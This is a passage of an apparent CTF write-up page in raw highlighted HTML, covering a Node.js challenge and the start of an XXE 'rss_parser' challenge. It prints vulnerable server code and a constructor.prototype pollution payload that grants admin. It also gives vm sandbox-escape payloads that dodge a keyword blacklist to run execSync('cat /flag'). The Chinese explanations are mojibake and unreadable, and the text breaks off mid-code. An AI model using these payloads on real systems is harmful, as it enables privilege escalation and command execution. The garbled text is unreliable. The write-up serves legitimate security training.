punctuation">&#123;</span>            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> target<span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">clone</span><span class="token punctuation">(</span><span class="token parameter">source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> source<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token parameter">code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'constructor'</span><span class="token punctuation">,</span> <span class="token string">'mainModule'</span><span class="token punctuation">,</span> <span class="token string">'require'</span><span class="token punctuation">,</span> <span class="token string">'child_process'</span><span class="token punctuation">,</span> <span class="token string">'process'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'execSync'</span><span class="token punctuation">,</span> <span class="token string">'execFile'</span><span class="token punctuation">,</span> <span class="token string">'execFileSync'</span><span class="token punctuation">,</span> <span class="token string">'spawn'</span><span class="token punctuation">,</span> <span class="token string">'spawnSync'</span><span class="token punctuation">,</span> <span class="token string">'fork'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> v <span class="token keyword">of</span> blacklist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>code<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>v <span class="token operator">+</span> <span class="token string">' is banned'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">requireLogin</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">delete</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>key<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/login.html'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/register.html'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> users <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> username        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> admins<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">=</span> <span class="token string">'admin'</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">=</span> <span class="token string">'guest'</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'login success'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'login failed'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> users<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'register failed'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> password        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'register success'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/profile'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string-property property">'user'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">,</span>        <span class="token string-property property">'role'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/sandbox'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> code <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>code        <span class="token keyword">let</span> sandbox <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>        <span class="token keyword">let</span> context <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token function">waf</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>            <span class="token keyword">let</span> result <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> context<span class="token punctuation">)</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token string-property property">'result'</span><span class="token operator">:</span> result            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token string-property property">'result'</span><span class="token operator">:</span> e<span class="token punctuation">.</span>message            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">'result'</span><span class="token operator">:</span> <span class="token string">'Your role is not admin, so you can not run any code'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server start listening on :3000'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">delete</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>key<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®ËøôÈáåÊØè‰∏ÄÊ¨°ËØ∑Ê±ÇÈÉΩ‰ºöÂà†Èô§prototypeÂÄº</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">'__proto__'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> target<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÖ∂ÂÆûÁúãÂà∞ËøôÂ∞±‰ºöÊÉ≥Âà∞ÊòØÂéüÂûãÈìæÊ±°ÊüìÔºå<code>__proto__</code>Ë¢´ËøáÊª§‰∫ÜÔºå‰ΩÜÊòØÂèØ‰ª•‰ΩøÁî®<code>constructor.prototype</code>Êù•ÁªïËøáËøáÊª§<br>ÂÖàÊ≥®ÂÜå‰∏Ä‰∏™<code>test</code>Áî®Êà∑, Âú®ÁôªÂΩïÊó∂ POST Â¶Ç‰∏ãÂÜÖÂÆπ, Ê±°Êüì<code>admins</code>ÂØπË±°, ‰ΩøÂæó<code>username in admins</code>Ë°®ËææÂºèÁöÑÁªìÊûú‰∏∫ <code>True</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>    <span class="token string-property property">"username"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>    <span class="token string-property property">"password"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>    <span class="token string-property property">"constructor"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"prototype"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"test"</span><span class="token operator">:</span> <span class="token string">"123"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/ba5c72a83e3441ba81966da664e63f15.png" alt="456"></p><p><img src="https://img-blog.csdnimg.cn/319fb067e4264030bd677e8afbdb914e.png" alt="1"></p><p>ÁÑ∂ÂêéÂ∞±ÊòØvmÊ≤ôÁÆ±ÈÄÉÈÄ∏<br>ÂèÇËÄÉÈìæÊé•<a href="https://xz.aliyun.com/t/11859#toc-4">Ê≤ôÁÆ±ÈÄÉÈÄ∏ÂàùËØÜ</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//ÊñπÊ≥ï‰∏ÄÔºö</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> cc <span class="token operator">=</span> arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller<span class="token punctuation">;</span>            <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token punctuation">(</span>cc<span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'return pro'</span><span class="token operator">+</span><span class="token string">'cess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> p<span class="token punctuation">[</span><span class="token string">'mainM'</span><span class="token operator">+</span><span class="token string">'odule'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'requ'</span><span class="token operator">+</span><span class="token string">'ire'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'child_pr'</span><span class="token operator">+</span><span class="token string">'ocess'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ex'</span><span class="token operator">+</span><span class="token string">'ecSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//ÊñπÊ≥ï‰∫åÔºö</span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> obj<span class="token punctuation">.</span><span class="token function">__defineGetter__</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> c <span class="token operator">=</span> arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller    <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'return pro'</span><span class="token operator">+</span><span class="token string">'cess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token punctuation">[</span><span class="token string">'mainM'</span><span class="token operator">+</span><span class="token string">'odule'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'requi'</span><span class="token operator">+</span><span class="token string">'re'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'child_pr'</span><span class="token operator">+</span><span class="token string">'ocess'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ex'</span><span class="token operator">+</span><span class="token string">'ecSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">throw</span> obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week-3-rss-parser"><a href="#Week-3-rss-parser" class="headerlink" title="[Week 3]rss_parser"></a>[Week 3]rss_parser</h2><p>ËÄÉÁÇπÔºöXXEÊºèÊ¥û„ÄÅËÆ°ÁÆópinÁ†Å„ÄÇ<br><img src="https://img-blog.csdnimg.cn/f82184db0289425da13a12befbca8763.png" alt="1"><br>ËøôÈáåËÆ©Êàë‰ª¨ËæìÂÖ•urlÔºåÁúãÂà∞xmlÊñá‰ª∂ÂèØ‰ª•ÊÉ≥Âà∞ÂèØËÉΩ‰ºöÂá∫Áé∞XXEÊºèÊ¥ûÔºåÁúã‰∏Ä‰∏ãÊ∫êÁ†ÅÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> requests<span class="token keyword">import</span> reapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        feed_url <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'^(http|https)://'</span><span class="token punctuation">,</span> feed_url<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>        content <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>feed_url<span class="token punctuation">)</span><span class="token punctuation">.</span>content        tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        rss_title <span class="token operator">=</span> tree<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/channel/title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        rss_link <span class="token operator">=</span> tree<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/channel/link'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        rss_posts <span class="token operator">=</span> tree<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'/channel/item'</span><span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> rss_title        result<span class="token punctuation">[</span><span class="token string">'link'</span><span class="token punctuation">]</span> <span class="token operator">=</span> rss_link        result<span class="token punctuation">[</span><span class="token string">'posts'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rss_posts<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>            rss_posts <span class="token operator">=</span> rss_posts<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> post <span class="token keyword">in</span> rss_posts<span class="token punctuation">:</span>            post_title <span class="token operator">=</span> post<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'./title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            post_link <span class="token operator">=</span> post<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'./link'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            result<span class="token punctuation">[</span><span class="token string">'posts'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'title'</span><span class="token punctuation">:</span> post_title<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">:</span> unquote<span class="token punctuation">(</span>post_link<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> feed_url<span class="token operator">=</span>feed_url<span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token 